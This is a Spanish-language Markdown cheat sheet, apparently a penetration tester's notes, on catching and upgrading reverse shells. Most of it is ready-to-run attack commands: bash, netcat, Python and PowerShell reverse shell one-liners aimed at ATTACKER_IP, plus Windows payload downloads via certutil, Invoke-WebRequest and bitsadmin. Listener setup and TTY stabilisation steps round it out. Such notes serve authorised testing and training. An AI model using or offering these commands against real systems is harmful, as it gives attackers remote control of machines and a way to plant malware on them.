---
tags: [tools, reverse-shell, penelope, rlwrap]
status: done
---

# Reverse Shells

> Establecer shells inversas y mejorar la interactividad del listener.

---

## Listeners

### Penelope — Listener interactivo recomendado
```bash
# Instalar
pip install penelope

# Escuchar (incluye manejo automático de señales, historial, etc.)
penelope 4444
penelope 4444 -i eth0
```

**Por qué penelope:** Manejo automático de PTY, resize de terminal, historial, Ctrl+C no mata la shell.

### rlwrap + nc (alternativa)
```bash
rlwrap nc -nlvp 4444

# rlwrap añade: historial de comandos, readline, flecha arriba/abajo
# nc solo: sin historial, Ctrl+C mata la shell
```

---

## Shells en el Target

### Linux — Bash mkfifo
```bash
# La más confiable
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Bash directo (a veces no funciona según la versión)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python (si disponible)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Windows — PowerShell
```powershell
# One-liner PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Mejorar Shell a TTY Completa

```bash
# En la shell obtenida (Linux)
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z para background
stty raw -echo; fg

# En la shell mejorada
export TERM=xterm
stty rows 40 cols 160
```

---

## Descargas en Windows

```powershell
# certutil (muy conocido pero funciona)
certutil.exe -urlcache -split -f http://ATTACKER_IP/payload.exe payload.exe

# PowerShell (más moderno)
Invoke-WebRequest -Uri http://ATTACKER_IP/payload.exe -OutFile payload.exe
(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_IP/p.exe", "p.exe")

# BITSAdmin (LOLBin)
bitsadmin /transfer myJob http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe
```

